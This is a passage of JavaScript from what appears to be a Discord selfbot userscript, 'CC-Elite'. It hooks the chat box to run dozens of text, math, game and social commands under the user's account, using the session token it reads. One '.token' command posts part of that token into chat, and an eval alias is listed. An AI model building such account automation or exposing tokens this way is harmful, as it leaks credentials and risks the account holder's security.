        console.log('[CC-Elite] Command system active | Prefixes: .help | !help');
    }

    async function handleKeydown(e) {
        if (e.key !== 'Enter' || e.shiftKey || e.ctrlKey || e.metaKey || e.altKey) return;

        // Find the active input
        const active = document.activeElement;
        const input = findDiscordInput();

        // Check if we're focused on the chat input
        let targetInput = null;
        if (active && (
            active.getAttribute('role') === 'textbox' ||
            active.contentEditable === 'true' ||
            active.tagName === 'TEXTAREA'
        )) {
            targetInput = active;
        } else if (input) {
            targetInput = input;
        }

        if (!targetInput) return;

        const text = getInputText(targetInput).trim();
        if (!text) return;

        // Check for command prefix
        let prefix = '';
        let commands = null;

        if (text.startsWith(COHOST_PREFIX)) {
            prefix = COHOST_PREFIX;
            commands = COHOST_COMMANDS;
        } else if (text.startsWith(REGULAR_PREFIX)) {
            prefix = REGULAR_PREFIX;
            commands = REGULAR_COMMANDS;
        } else {
            // Auto-reply system
            if (state.autoReplies && Object.keys(state.autoReplies).length > 0) {
                const lower = text.toLowerCase();
                for (const [trigger, response] of Object.entries(state.autoReplies)) {
                    if (lower.includes(trigger.toLowerCase())) {
                        setTimeout(() => sendMessage(response), 600);
                        break;
                    }
                }
            }
            return;
        }

        // Prevent Discord from processing this Enter
        e.preventDefault();
        e.stopPropagation();
        if (e.stopImmediatePropagation) e.stopImmediatePropagation();

        // Auto-set owner
        if (prefix === COHOST_PREFIX && !OWNER_ID) {
            const myId = getUserId();
            if (myId) { OWNER_ID = myId; Settings.save('ownerId', OWNER_ID); state.isOwner = true; }
        }

        if (prefix === COHOST_PREFIX && !canUseCohostCommands()) {
            showToast('Cohost access required', 'error');
            clearInput(targetInput);
            return;
        }

        // Parse command
        const cmdText = text.slice(prefix.length).trim();
        if (!cmdText) { clearInput(targetInput); return; }

        const args = cmdText.split(/\s+/);
        const cmd = args.shift().toLowerCase();

        console.log('[CC-Elite] Command:', prefix + cmd, args);
        state.commandHistory.push({ cmd, args, time: Date.now() });
        state.stats.commandsUsed++;
        Settings.save('stats', state.stats);

        let result = null;
        if (commands[cmd]) {
            try {
                if (typeof commands[cmd] === 'function') {
                    result = commands[cmd](args);
                    if (result instanceof Promise) result = await result;
                } else if (typeof commands[cmd] === 'object' && commands[cmd].run) {
                    result = commands[cmd].run(args);
                    if (result instanceof Promise) result = await result;
                }

                if (typeof result === 'string' && result) {
                    await sendMessage(result);
                    if (state.autoDel) {
                        setTimeout(() => deleteOwnCommand(targetInput), 2500);
                    }
                }
            } catch (err) {
                console.error('[CC-Elite] Command error:', err);
                showToast('Error: ' + (err.message || 'Unknown'), 'error');
                try { await sendMessage('Error: ' + (err.message || 'Command failed')); } catch { }
            }
        } else {
            // Try aliases
            const aliased = findAlias(prefix, cmd);
            if (aliased && commands[aliased]) {
                try {
                    result = commands[aliased](args);
                    if (result instanceof Promise) result = await result;
                    if (typeof result === 'string' && result) {
                        await sendMessage(result);
                        if (state.autoDel) setTimeout(() => deleteOwnCommand(targetInput), 2500);
                    }
                } catch (err) {
                    console.error('[CC-Elite] Alias error:', err);
                }
            } else {
                await sendMessage('Unknown command: `' + prefix + cmd + '` — Use `' + prefix + 'help` for list.');
            }
        }

        // Clear input
        clearInput(targetInput);
    }

    async function handleInputKeydown(e) {
        if (e.key !== 'Enter' || e.shiftKey || e.ctrlKey || e.metaKey || e.altKey) return;

        const text = getInputText(e.target).trim();
        if (!text) return;

        if (text.startsWith(COHOST_PREFIX) || text.startsWith(REGULAR_PREFIX)) {
            e.preventDefault();
            e.stopPropagation();
            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
            await processCommand(text, e.target);
        }
    }

    async function processCommand(text, input) {
        const prefix = text.startsWith(COHOST_PREFIX) ? COHOST_PREFIX : REGULAR_PREFIX;
        const commands = prefix === COHOST_PREFIX ? COHOST_COMMANDS : REGULAR_COMMANDS;

        if (prefix === COHOST_PREFIX && !OWNER_ID) {
            const myId = getUserId();
            if (myId) { OWNER_ID = myId; Settings.save('ownerId', OWNER_ID); state.isOwner = true; }
        }

        if (prefix === COHOST_PREFIX && !canUseCohostCommands()) {
            showToast('Cohost access required', 'error');
            clearInput(input);
            return;
        }

        const cmdText = text.slice(prefix.length).trim();
        if (!cmdText) { clearInput(input); return; }

        const args = cmdText.split(/\s+/);
        const cmd = args.shift().toLowerCase();

        state.commandHistory.push({ cmd, args, time: Date.now() });
        state.stats.commandsUsed++;
        Settings.save('stats', state.stats);

        let result = null;
        if (commands[cmd]) {
            try {
                result = commands[cmd](args);
                if (result instanceof Promise) result = await result;
                if (typeof result === 'string' && result) {
                    await sendMessage(result);
                    if (state.autoDel) setTimeout(() => deleteOwnCommand(input), 2500);
                }
            } catch (err) {
                console.error('[CC-Elite] Command error:', err);
            }
        } else {
            const aliased = findAlias(prefix, cmd);
            if (aliased && commands[aliased]) {
                try {
                    result = commands[aliased](args);
                    if (result instanceof Promise) result = await result;
                    if (typeof result === 'string' && result) await sendMessage(result);
                } catch (err) { console.error('[CC-Elite] Alias error:', err); }
            } else {
                await sendMessage('Unknown command: `' + prefix + cmd + '`');
            }
        }

        clearInput(input);
    }

    async function deleteOwnCommand(input) {
        try {
            const msgs = await getMessages(getChannelId(), 8);
            const myId = getUserId();
            for (const m of msgs) {
                if (m.author.id === myId && (m.content.startsWith('.') || m.content.startsWith('!'))) {
                    await deleteMessage(getChannelId(), m.id);
                }
            }
        } catch { }
    }

    function findAlias(prefix, cmd) {
        const aliases = {
            'reg': { '.': 'help', '!': 'help' },
            'h': { '.': 'help', '!': 'help' },
            'p': { '.': 'ping', '!': 'ping' },
            'si': { '.': 'serverinfo', '!': 'serverinfo' },
            'ui': { '.': 'userinfo', '!': 'userinfo' },
            'av': { '.': 'avatar', '!': 'avatar' },
            'bn': { '.': 'banner', '!': 'banner' },
            'ru': { '.': 'roulette', '!': 'roulette' },
            's': { '.': 'slots', '!': 'slots' },
            'cf': { '.': 'coinflip', '!': 'coinflip' },
            'bal': { '.': 'balance', '!': 'balance' },
            'inv': { '.': 'invite', '!': 'invite' },
            'purge': { '.': 'purge', '!': 'purge' },
            'del': { '.': 'delnote', '!': 'purge' },
            'm': { '.': 'mock', '!': 'mute' },
            'n': { '.': 'note', '!': 'nick' },
            'w': { '.': 'weather', '!': 'webhook' },
            't': { '.': 'todo', '!': 'typing' },
            'e': { '.': 'emoji', '!': 'eval' },
            'c': { '.': 'calc', '!': 'createchannel' },
        };
        return aliases[cmd]?.[prefix] || null;
    }


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 8: COMMAND REGISTRY — REGULAR COMMANDS (180+)
       ═══════════════════════════════════════════════════════════════════════ */

    const REGULAR_COMMANDS = {

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 1: BASIC COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        help(a) {
            if (a && a[0]) {
                const all = { ...REGULAR_COMMANDS, ...COHOST_COMMANDS };
                if (all[a[0].toLowerCase()]) return '**\u2699\uFE0F ' + SCRIPT_NAME + '** — `.' + a[0] + ' [args]`\nCategory: *Use .cmds to browse all*';
                return '\u274C Unknown command: `.' + a[0] + '`';
            }
            return `**\uD83D\uDCB8 ${SCRIPT_NAME} v${VERSION}**
\u260E\uFE0F Type **\`.cmds\`** for full categorized command list
\uD83D\uDCD6 Type **\`.help <command>\`** for details
\u26A1 **Quick**: .ping .calc .slots .8ball .avatar .serverinfo .mock
\uD83D\uDD11 **Prefix**: Regular: \`${REGULAR_PREFIX}\` | Cohost: \`${COHOST_PREFIX}\`
**${Object.keys(REGULAR_COMMANDS).length}** regular + **${Object.keys(COHOST_COMMANDS).length - Object.keys(REGULAR_COMMANDS).length}** cohost commands`;
        },

        cmds() {
            return `**\uD83D\uDCCB ${SCRIPT_NAME} v${VERSION} — COMMAND LIST**

**\uD83D\uDD34 BASIC** (12)
.help .ping .calc .math .uuid .password .token .myid .uptime .id .whoami .cmds

**\uD83C\uDF88 FUN** (18)
.mock .zalgo .reverse .caps .smallcaps .vaporwave .leet .binary .morse .ascii
.emojify .clap .space .cursive .bubbles .square .wide .tiny

**\uD83C\uDFA8 ASCII ART** (20)
.shrug .lenny .tableflip .unflip .cry .angry .sad .happy .dance .party
.cool .wave .salute .run .bear .cat .dog .owl .spider .wizard

**\uD83E\uDD1D SOCIAL** (14)
.hug .kiss .slap .punch .highfive .wave .pat .cuddle .bite .poke .bonk
.wavegif .yeet .boop

**\uD83C\uDFAE GAMES** (16)
.rps .slots .8ball .rate .ship .fortune .horoscope .roast .compliment
.pickup .joke .guess .trivia .wyr .tod .riddle

**\uD83D\uDCB0 ECONOMY** (8)
.balance .daily .work .beg .rob .deposit .withdraw .pay

**\uD83D\uDCC8 LEVELING** (3)
.rank .leaderboard .xp

**\u2139\uFE0F INFO** (10)
.channel .serverinfo .userinfo .avatar .banner .roles .channels .members
.invite .guildinfo

**\uD83D\uDD27 UTILITY** (16)
.len .upper .lower .title .base64 .unbase64 .hex .clipboard .paste .urlencode
.timer .stopwatch .remind .todo .note .notes

**\uD83D\uDCD0 RANDOM** (8)
.coin .roll .dice .random .choice .shuffle .lottery .roulette

**\u270F\uFE0F FORMAT** (10)
.bold .italic .underline .strike .spoiler .code .codeblock .quote .multiquote .heading

**\uD83D\uDCD5 TEXT** (10)
.figlet .rainbow .fire .ice .shadow .retro .neon .hacker .fancy .double

**\uD83D\uDD2E MATH** (12)
.sqrt .pow .pi .sin .cos .tan .log .factorial .fibonacci .prime .abs .round

**\uD83D\uDD11 MOD** (7)
.ban .kick .mute .purge .lock .unlock .slowmode

**\uD83C\uDF10 WEB** (5)
.weather .translate .ipinfo .qr .shorten

**\u2699\uFE0F META** (6)
.owner .cohosts .badges .changelog .version .settings

\uD83D\uDD10 Cohost commands: Use **\`!help\`** (${Object.keys(COHOST_COMMANDS).length - Object.keys(REGULAR_COMMANDS).length}+ cmds)`;
        },

        async ping() {
            const s = performance.now();
            try {
                await fetch('https://discord.com/api/v9/users/@me', { headers: { Authorization: getToken() || '' } });
                return '\uD83C\uDFD3 Pong! API: `' + Math.round(performance.now() - s) + 'ms`';
            } catch { return '\uD83C\uDFD3 Pong!'; }
        },

        calc(a) {
            try {
                const expr = (a || []).join(' ').replace(/[^0-9+\-*/().\s^%]/g, '');
                if (!expr) return 'Usage: .calc <expression>';
                const safe = expr.replace(/\^/g, '**');
                return '\uD83D\uDCD0 `' + expr + '` = **' + Function('"use strict"; return (' + safe + ')')() + '**';
            } catch { return '\u274C Invalid expression'; }
        },
        math(a) { return REGULAR_COMMANDS.calc(a); },

        sqrt(a) { try { return '\u221A' + a[0] + ' = **' + Math.sqrt(parseFloat(a[0])).toFixed(4) + '**'; } catch { return 'Usage: .sqrt <number>'; } },
        pow(a) { try { return a[0] + '^' + a[1] + ' = **' + Math.pow(parseFloat(a[0]), parseFloat(a[1])).toFixed(4) + '**'; } catch { return 'Usage: .pow <base> <exp>'; } },
        pi() { return '\u03C0 = **' + Math.PI.toFixed(10) + '**'; },
        sin(a) { try { return 'sin(' + a[0] + '\u00B0) = **' + Math.sin(parseFloat(a[0]) * Math.PI / 180).toFixed(4) + '**'; } catch { return 'Usage: .sin <degrees>'; } },
        cos(a) { try { return 'cos(' + a[0] + '\u00B0) = **' + Math.cos(parseFloat(a[0]) * Math.PI / 180).toFixed(4) + '**'; } catch { return 'Usage: .cos <degrees>'; } },
        tan(a) { try { return 'tan(' + a[0] + '\u00B0) = **' + Math.tan(parseFloat(a[0]) * Math.PI / 180).toFixed(4) + '**'; } catch { return 'Usage: .tan <degrees>'; } },
        log(a) { try { return 'log(' + a[0] + ') = **' + Math.log(parseFloat(a[0])).toFixed(4) + '**'; } catch { return 'Usage: .log <number>'; } },
        abs(a) { try { return '|' + a[0] + '| = **' + Math.abs(parseFloat(a[0])) + '**'; } catch { return 'Usage: .abs <number>'; } },
        round(a) { try { return 'round(' + a[0] + ') = **' + Math.round(parseFloat(a[0])) + '**'; } catch { return 'Usage: .round <number>'; } },
        factorial(a) {
            let n = parseInt(a[0]) || 0;
            if (n < 0) return 'Usage: .factorial <n>';
            if (n > 170) return '\u274C Number too large';
            let r = 1; for (let i = 2; i <= n; i++) r *= i;
            return n + '! = **' + (r > 1e10 ? r.toExponential(4) : r) + '**';
        },
        fibonacci(a) {
            let n = parseInt(a[0]) || 0;
            if (n > 1476) return '\u274C Too large';
            let f = [0n, 1n]; for (let i = 2; i <= n; i++) f.push(f[i - 1] + f[i - 2]);
            return 'Fib(' + n + ') = **' + f[n].toString() + '**';
        },
        prime(a) {
            const n = parseInt(a[0]) || 2;
            if (n < 2) return n + ' is **not prime**';
            for (let i = 2; i <= Math.sqrt(n); i++) if (n % i === 0) return n + ' is **not prime** (divisible by ' + i + ')';
            return n + ' is **prime**';
        },

        uuid() { return '\uD83D\uDD11 `' + $.uuid() + '`'; },

        password(a) {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
            const len = Math.min(parseInt(a && a[0]) || 16, 128);
            let p = ''; for (let i = 0; i < len; i++) p += chars[Math.floor(Math.random() * chars.length)];
            return '\uD83D\uDD10 Generated (' + len + '): ||' + p + '||';
        },

        token() {
            const t = getToken();
            return t ? '\uD83D\uDD11 Token: `' + t.slice(0, 20) + '...' + t.slice(-4) + '`\n*Use .tokeninfo for decoded info*' : '\u274C Not found';
        },
        myid() { return '\uD83D\uDC64 Your ID: `' + (state.userId || getUserId() || 'Not found') + '`'; },
        id() { return REGULAR_COMMANDS.myid(); },
        whoami() { return '\uD83D\uDC64 You are **' + (state.username || 'Unknown') + '** (`' + (state.userId || '???') + '`)'; },
        uptime() { return '\u23F1\uFE0F Uptime: **' + $.fmtDuration(Date.now() - (state.stats.startTime || Date.now())) + '**'; },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 2: FUN COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        mock(a) {
            const t = (a || []).join(' ') || 'mock me daddy';
            return t.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join('');
        },

        zalgo(a) {
            const t = (a || []).join(' ') || 'zalgo';
            const z = ['\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315'];
            return t.split('').map(c => c + z[Math.floor(Math.random() * z.length)] + z[Math.floor(Math.random() * z.length)]).join('');
        },

        reverse(a) { return '\uD83D\uDD04 ' + (a || []).join(' ').split('').reverse().join(''); },
        caps(a) { return '\uD83D\uDD0A ' + (a || []).join(' ').toUpperCase(); },

        smallcaps(a) {
            const t = (a || []).join(' ').toLowerCase();
            const m = { a: '\u1D00', b: '\u0299', c: '\u1D04', d: '\u1D05', e: '\u1D07', f: '\uA730', g: '\u0262', h: '\u029C', i: '\u026A', j: '\u1D0A', k: '\u1D0B', l: '\u029F', m: '\u1D0D', n: '\u0274', o: '\u1D0F', p: '\u1D18', q: '\uA7AF', r: '\u0280', s: '\uA731', t: '\u1D1B', u: '\u1D1C', v: '\u1D20', w: '\u1D21', x: '\u02E3', y: '\u028F', z: '\u1D22' };
            return t.split('').map(c => m[c] || c).join('');
        },

        vaporwave(a) {
            const t = (a || []).join(' ').toLowerCase();
            const m = { a: '\uFF41', b: '\uFF42', c: '\uFF43', d: '\uFF44', e: '\uFF45', f: '\uFF46', g: '\uFF47', h: '\uFF48', i: '\uFF49', j: '\uFF4A', k: '\uFF4B', l: '\uFF4C', m: '\uFF4D', n: '\uFF4E', o: '\uFF4F', p: '\uFF50', q: '\uFF51', r: '\uFF52', s: '\uFF53', t: '\uFF54', u: '\uFF55', v: '\uFF56', w: '\uFF57', x: '\uFF58', y: '\uFF59', z: '\uFF5A', ' ': '\u3000' };
            return t.split('').map(c => m[c] || c).join('');
        },

        leet(a) {
            const t = (a || []).join(' ').toLowerCase();
            const m = { a: '4', b: '8', e: '3', g: '6', i: '1', o: '0', s: '5', t: '7', z: '2', l: '1', a: '@' };
            return t.split('').map(c => m[c] || c).join('');
        },

        binary(a) { return (a || []).join(' ').split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '); },

        morse(a) {
            const m = { a: '.-', b: '-...', c: '-.-.', d: '-..', e: '.', f: '..-.', g: '--.', h: '....', i: '..', j: '.---', k: '-.-', l: '.-..', m: '--', n: '-.', o: '---', p: '.--.', q: '--.-', r: '.-.', s: '...', t: '-', u: '..-', v: '...-', w: '.--', x: '-..-', y: '-.--', z: '--..', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.', '0': '-----', ' ': '/' };
            return (a || []).join(' ').toLowerCase().split('').map(c => m[c] || c).join(' ');
        },

        ascii(a) { return (a || []).join(' ').toUpperCase().split('').join(' '); },

        emojify(a) {
            const t = (a || []).join(' ').toLowerCase();
            const m = { a: '\uD83C\uDF4D', b: '\uD83C\uDF71', c: '\uD83E\uDD9E', d: '\uD83E\uDD16', e: '\uD83C\uDF45', f: '\uD83C\uDF3D', g: '\uD83C\uDF47', h: '\uD83C\uDF3E', i: '\uD83E\uDDF5', j: '\uD83C\uDF6D', k: '\uD83C\uDF51', l: '\uD83C\uDF4B', m: '\uD83C\uDF48', n: '\uD83C\uDF3C', o: '\uD83C\uDF52', p: '\uD83C\uDF4D', q: '\uD83E\uDD5A', r: '\uD83C\uDF30', s: '\uD83C\uDF53', t: '\uD83C\uDF35', u: '\uD83C\uDF49', v: '\uD83C\uDF3B', w: '\uD83C\uDF4C', x: '\u274C', y: '\uD83C\uDF66', z: '\uD83E\uDD66', ' ': '\u2B1C' };
            return t.split('').map(c => m[c] || c).join('');
        },

        clap(a) { return '\uD83D\uDC4F ' + (a || []).join(' \uD83D\uDC4F ') + ' \uD83D\uDC4F'; },
        space(a) { return (a || []).join(' ').split('').join(' '); },
        bubbles(a) { return (a || []).join(' ').replace(/[a-zA-Z]/g, c => '\u25CF' + c + '\u25CF'); },
        wide(a) { return (a || []).join(' ').split('').map(c => c + ' ').join(''); },
        tiny(a) {
            const t = (a || []).join(' ').toLowerCase();
            const m = { a: '\u1D43', b: '\u1D47', c: '\u1D9C', d: '\u1D48', e: '\u1D49', f: '\u1DA0', g: '\u1D4D', h: '\u02B0', i: '\u2071', j: '\u02B2', k: '\u1D4F', l: '\u02E1', m: '\u1D50', n: '\u207F', o: '\u1D52', p: '\u1D56', q: '\u02A0', r: '\u02B3', s: '\u02E2', t: '\u1D57', u: '\u1D58', v: '\u1D5B', w: '\u02B7', x: '\u02E3', y: '\u02B8', z: '\u1DBB' };
            return t.split('').map(c => m[c] || c).join('');
        },
        cursive(a) {
            const t = (a || []).join(' ').toLowerCase();
            const m = { a: '\uD835\uDCC6', b: '\uD835\uDCC7', c: '\uD835\uDCC8', d: '\uD835\uDCC9', e: '\uD835\uDCCA', f: '\uD835\uDCCB', g: '\uD835\uDCCC', h: '\uD835\uDCCD', i: '\uD835\uDCCE', j: '\uD835\uDCCF', k: '\uD835\uDCD0', l: '\uD835\uDCD1', m: '\uD835\uDCD2', n: '\uD835\uDCD3', o: '\uD835\uDCD4', p: '\uD835\uDCD5', q: '\uD835\uDCD6', r: '\uD835\uDCD7', s: '\uD835\uDCD8', t: '\uD835\uDCD9', u: '\uD835\uDCDA', v: '\uD835\uDCDB', w: '\uD835\uDCDC', x: '\uD835\uDCDD', y: '\uD835\uDCDE', z: '\uD835\uDCDF' };
            return t.split('').map(c => m[c] || c).join('');
        },
        square(a) {
            const t = (a || []).join(' ');
            return t.split('').map(c => {
                const code = c.charCodeAt(0);
                if (code >= 65 && code <= 90) return String.fromCharCode(0x1F130 + code - 65);
                if (code >= 97 && code <= 122) return String.fromCharCode(0x1F130 + code - 97);
                return c;
            }).join('');
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 3: ASCII ART
           ═══════════════════════════════════════════════════════════════ */

        shrug() { return '\u00AF\\_(' + '\u30C4' + ')_/\u00AF'; },
        lenny() { return '(' + '\u0361' + '\u00B0 ' + '\u035C' + '\u0296 ' + '\u0361' + '\u00B0)'; },
        tableflip() { return '(' + '\u256F' + '\u00B0' + '\u25A1' + '\u00B0)' + '\u256F ' + '\uFE35 ' + '\u253B' + '\u2501' + '\u253B'; },
        unflip() { return '\u253B' + '\u2501' + '\u253B ' + '\u30CE( ' + '\u30EE-' + '\u30EE' + '\u30CE)'; },
        cry() { return '\u0CA5' + '_' + '\u0CA5'; },
        angry() { return '\u0CA0' + '_' + '\u0CA0'; },
        sad() { return '(' + '\u25D5' + '\uFE4F' + '\u25D5)'; },
        happy() { return '\u30FE(' + '\u25D5' + '\u203F' + '\u25D5)' + '\uFF89'; },
        dance() { return '\u266A' + '\u253B(' + '\uFF65o' + '\uFF65)' + '\u253B' + '\u266A'; },
        party() { return '\u266A' + '\u253B(' + '\u25D1' + '\u203F' + '\u25D0)' + '\u253B' + '\u266A'; },
        cool() { return '(' + '\u2310' + '\u25A0' + '_' + '\u25A0)'; },
        wave() { return '( ' + '\u2022_' + '\u2022)/'; },
        salute() { return '( ' + '\u30FB_' + '\u30FB)' + '\u309E'; },
        run() { return '\u1555( ' + '\u15D2' + '\u0296' + '\u15D2 ' + ')' + '\u1557'; },
        bear() { return '\u028D' + '\u2022' + '\u1D17' + '\u2022' + '\u028D'; },
        cat() { return '(=^' + '\uFF65' + '\u03C9' + '\uFF65^=)'; },
        dog() { return '(' + '\u25D5' + '\u1D17' + '\u25D5)'; },
        owl() { return '(' + '\u25E1' + '\u203F' + '\u25E1)'; },
        spider() { return '/\\(oo)/\\'; },
        wizard() { return '(' + '\u2609' + '\u203F' + '\u2609)'; },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 4: SOCIAL COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        hug(a) { const t = this._mention(a); return '*hugs ' + t + '* ' + '\u2728'; },
        kiss(a) { const t = this._mention(a); return '*kisses ' + t + '* ' + '\u2764\uFE0F'; },
        slap(a) { const t = this._mention(a); return '*slaps ' + t + '* ' + '\u270B'; },
        punch(a) { const t = this._mention(a); return '*punches ' + t + '* ' + '\uD83D\uDC4A'; },
        highfive(a) { const t = this._mention(a); return '*high fives ' + t + '* ' + '\uD83E\uDD1A'; },
        pat(a) { const t = this._mention(a); return '*pats ' + t + '* ' + '\uD83D\uDC3E'; },
        cuddle(a) { const t = this._mention(a); return '*cuddles ' + t + '* ' + '\uD83E\uDD17'; },
        bite(a) { const t = this._mention(a); return '*bites ' + t + '* ' + '\uD83E\uDD19'; },
        poke(a) { const t = this._mention(a); return '*pokes ' + t + '* ' + '\u261D\uFE0F'; },
        bonk(a) { const t = this._mention(a); return '*bonks ' + t + ' with a bat* ' + '\uD83D\uDD28'; },
        yeet(a) { const t = this._mention(a); return '*yeets ' + t + ' into the sun* ' + '\u2600\uFE0F'; },
        boop(a) { const t = this._mention(a); return '*boops ' + t + '\u2019s nose* ' + '\uD83D\uDC37'; },

        _mention(a) { return (a && a[0]) ? '<@' + a[0].replace(/[<@!>]/g, '') + '>' : 'the air'; },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 5: GAMES
           ═══════════════════════════════════════════════════════════════ */

        rps(a) {
            const c = ['rock', 'paper', 'scissors'];
            const u = ((a && a[0]) || 'rock').toLowerCase();
            if (!c.includes(u)) return '\u270C\uFE0F Choose: rock, paper, or scissors';
            const b = c[Math.floor(Math.random() * 3)];
            const w = (u === 'rock' && b === 'scissors') || (u === 'paper' && b === 'rock') || (u === 'scissors' && b === 'paper');
            return '\uD83D\uDD34 You: **' + u + '** | Me: **' + b + '**\n' + (u === b ? '\u26D4 Tie!' : w ? '\uD83C\uDF89 You win!' : '\uD83D\uDC80 You lose!');
        },

        slots() {
            const s = ['\uD83C\uDF52', '\uD83C\uDF4B', '\uD83C\uDF47', '\uD83D\uDC8E', '7\uFE0F\u20E3', '\u2B06\uFE0F'];
            const r = [0, 0, 0].map(() => s[Math.floor(Math.random() * 6)]);
            return '\uD83C\uDFB0 [ ' + r.join(' | ') + ' ] ' + (r[0] === r[1] && r[1] === r[2] ? '**\uD83C\uDF89 JACKPOT!**' : r[0] === r[1] || r[1] === r[2] || r[0] === r[2] ? '**\u2B50 Winner!**' : '');
        },

        '8ball'(a) {
            const q = (a || []).join(' ') || 'question';
            const r = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'Without a doubt', 'Very doubtful', 'Outlook good', 'Cannot predict now', 'Signs point to yes', 'Don\'t count on it', 'Most likely', 'Better not tell you'];
            return '\uD83C\uDFB1 **Q:** ' + q + '\n\uD83D\uDD0E **A:** ' + r[Math.floor(Math.random() * r.length)];
        },

        rate(a) { return '\u2B50 I rate **' + ((a || []).join(' ') || 'you') + '** a **' + $.rand(1, 10) + '/10**'; },

        ship(a) {
            if (!a || a.length < 2) return '\u2764\uFE0F Usage: .ship @user1 @user2';
            const pct = $.rand(0, 100);
            const bar = '\uD83D\uDFE5'.repeat(Math.floor(pct / 10)) + '\u2B1C'.repeat(10 - Math.floor(pct / 10));
            return '\uD83D\uDC91 **Ship:** ' + pct + '%\n' + bar;
        },

        fortune() {
            const f = ['Good luck is coming your way.', 'Be careful with decisions today.', 'A surprise awaits you soon.', 'Trust your instincts.', 'Success is just around the corner.', 'New opportunity will present itself.', 'A friend will help you unexpectedly.', 'Fortune favors the bold.'];
            return '\uD83D\uDD2E ' + f[Math.floor(Math.random() * f.length)];
        },

        horoscope(a) {
            const signs = ['Aries', 'Taurus', 'Gemini', 'Cancer', 'Leo', 'Virgo', 'Libra', 'Scorpio', 'Sagittarius', 'Capricorn', 'Aquarius', 'Pisces'];
            const s = ((a && a[0]) || signs[Math.floor(Math.random() * 12)]).charAt(0).toUpperCase() + (((a && a[0]) || '').slice(1).toLowerCase() || signs[Math.floor(Math.random() * 12)].slice(1));
            const readings = ['Today brings exciting opportunities. Stay open to change.', 'Focus on your goals — progress is imminent.', 'A meaningful conversation will brighten your day.', 'Creativity flows through you today.', 'Trust your intuition in matters of the heart.', 'Financial prospects look promising.'];
            return '\uD83C\uDF19 **' + s + '**\n' + readings[Math.floor(Math.random() * readings.length)];
        },

        roast(a) {
            const r = ["You're like a cloud. When you disappear, it\u2019s a beautiful day.", "I\u2019d agree with you but then we\u2019d both be wrong.", "You\u2019re not stupid; you just have bad luck thinking.", "Somewhere out there, a tree is producing oxygen for you. You owe it an apology.", "You bring everyone so much joy — when you leave the room.", "I'm jealous of people who don't know you.", "If I had a dollar for every brain you don't have, I'd have one dollar.", "You're proof that evolution can go in reverse.", "I'd explain it to you but I left my crayons at home.", "You're like a software update — nobody wants you."];
            const t = (a && a[0]) ? '<@' + a[0].replace(/[<@!>]/g, '') + '>' : 'You';
            return t + ', ' + r[Math.floor(Math.random() * r.length)];
        },

        compliment(a) {
            const c = ["You\u2019re absolutely amazing!", "You make the world a better place!", "You\u2019re a ray of sunshine!", "You\u2019re one of a kind!", "You light up every room!", "You\u2019re incredible!", "Your smile is contagious!", "You\u2019re a true legend!"];
            const t = (a && a[0]) ? '<@' + a[0].replace(/[<@!>]/g, '') + '>' : 'You';
            return t + ', ' + c[Math.floor(Math.random() * c.length)];
        },

        pickup() {
            const l = ["Are you a magician? Because whenever I look at you, everyone else disappears.", "Are you a bank loan? Because you have my interest.", "Is your name Google? Because you have everything I\u2019ve been searching for.", "Are you WiFi? Because I\u2019m feeling a connection.", "Do you have a map? I keep getting lost in your eyes.", "Are you made of copper and tellurium? Because you\u2019re Cu-Te."];
            return '\uD83D\uDC98 ' + l[Math.floor(Math.random() * l.length)];
        },

        joke() {
            const j = ["Why don't scientists trust atoms? Because they make up everything!", "Why did the scarecrow win an award? He was outstanding in his field!", "What do you call a fake noodle? An impasta!", "Why did the bicycle fall over? It was two tired!", "What do you call a bear with no teeth? A gummy bear!", "Why don't eggs tell jokes? They'd crack each other up!", "What do you call cheese that isn't yours? Nacho cheese!"];
            return '\uD83E\uDD21 ' + j[Math.floor(Math.random() * j.length)];
        },

        guess(a) {
            const g = parseInt(a && a[0]);
            if (isNaN(g) || g < 1 || g > 100) return '\uD83C\uDFB2 Usage: .guess <number 1-100>';
            const ans = $.rand(1, 100);
            const diff = Math.abs(g - ans);
            return g === ans ? '\uD83C\uDF89 Correct! The answer was **' + ans + '**!' : diff <= 5 ? '\uD83D\uDD25 So close! (' + g + ') The answer was **' + ans + '**' : '\u274C ' + (g > ans ? 'Too high' : 'Too low') + '! The answer was **' + ans + '**';
        },

        trivia() {
            const q = [
                { q: 'What is the capital of France?', a: 'Paris' },
                { q: 'What planet is known as the Red Planet?', a: 'Mars' },
                { q: 'What is the largest ocean on Earth?', a: 'Pacific' },
                { q: 'Who painted the Mona Lisa?', a: 'Leonardo da Vinci' },
                { q: 'What is the smallest prime number?', a: '2' },
                { q: 'What element has the chemical symbol Au?', a: 'Gold' },
                { q: 'In what year did WWII end?', a: '1945' },
                { q: 'What is the tallest mountain in the world?', a: 'Mount Everest' }
            ];
            const item = q[Math.floor(Math.random() * q.length)];
            return '\uD83C\uDFAE **Trivia:** ' + item.q + '\n\uD83D\uDD10 *Answer:* ||' + item.a + '||';
        },

        wyr() {
            const r = ['Would you rather be invisible or fly?', 'Would you rather be rich or famous?', 'Would you rather have no internet or no phone?', 'Would you rather speak all languages or play all instruments?', 'Would you rather live in space or underwater?', 'Would you rather be the best at one thing or average at everything?'];
            return '\uD83E\uDD14 **Would You Rather:**\n' + r[Math.floor(Math.random() * r.length)];
        },

        tod(a) {
